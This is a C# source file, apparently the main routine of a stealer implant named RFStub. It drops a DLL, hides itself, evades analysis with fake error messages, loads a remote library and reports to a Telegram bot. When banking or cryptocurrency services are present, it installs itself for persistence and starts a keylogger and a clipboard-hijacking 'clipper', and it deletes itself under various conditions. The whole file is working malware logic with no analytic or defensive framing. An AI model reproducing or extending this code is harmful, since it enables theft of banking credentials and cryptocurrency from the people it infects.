using System;
using System.IO;
using System.Net;
using System.Threading;
using RFStub.Implant;
using RFStub.Properties;
using RFStub.Telegram;
using Stealer;

namespace RFStub;

internal class Program
{
	[STAThread]
	private static void Main(string[] args)
	{
		Thread thread = null;
		Thread thread2 = null;
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		ServicePointManager.DefaultConnectionLimit = 9999;
		File.WriteAllBytes("DotNetZip.dll", Resources.DNZ);
		MutexControl.Check();
		if (!Startup.IsFromStartup())
		{
			Startup.HideFile();
		}
		if (Config.TelegramAPI.Contains("---") || Config.TelegramID.Contains("---"))
		{
			SelfDestruct.Melt();
		}
		if (Config.StartDelay == "1")
		{
			StartDelay.Run();
		}
		if (AntiAnalysis.Run())
		{
			AntiAnalysis.FakeErrorMessage();
		}
		Directory.SetCurrentDirectory(Paths.lappdata);
		if (!Libs.LoadRemoteLibrary(Libs.ZipLib))
		{
			AntiAnalysis.FakeErrorMessage();
		}
		Config.Init();
		if (RFStub.Telegram.Report.TokenIsValid())
		{
			SelfDestruct.Melt();
		}
		RFStub.Telegram.Report.SendReport();
		if (Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices) && !Startup.IsInstalled() && !Startup.IsFromStartup())
		{
			Startup.Install();
		}
		if (Config.KeyloggerModule == "1" && Counter.BankingServices && Config.Autorun == "1")
		{
			Console.WriteLine("Starting keylogger modules...");
			thread = WindowManager.MainThread;
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
		}
		if (Config.ClipperModule == "1" && Counter.CryptoServices && Config.Autorun == "1")
		{
			Console.WriteLine("Starting clipper modules...");
			thread2 = ClipboardManager.MainThread;
			thread2.SetApartmentState(ApartmentState.STA);
			thread2.Start();
		}
		if (thread != null && thread.IsAlive)
		{
			thread.Join();
		}
		if (thread != null && thread2.IsAlive)
		{
			thread2.Join();
		}
		if (!Startup.IsFromStartup())
		{
			SelfDestruct.Melt();
		}
	}
}
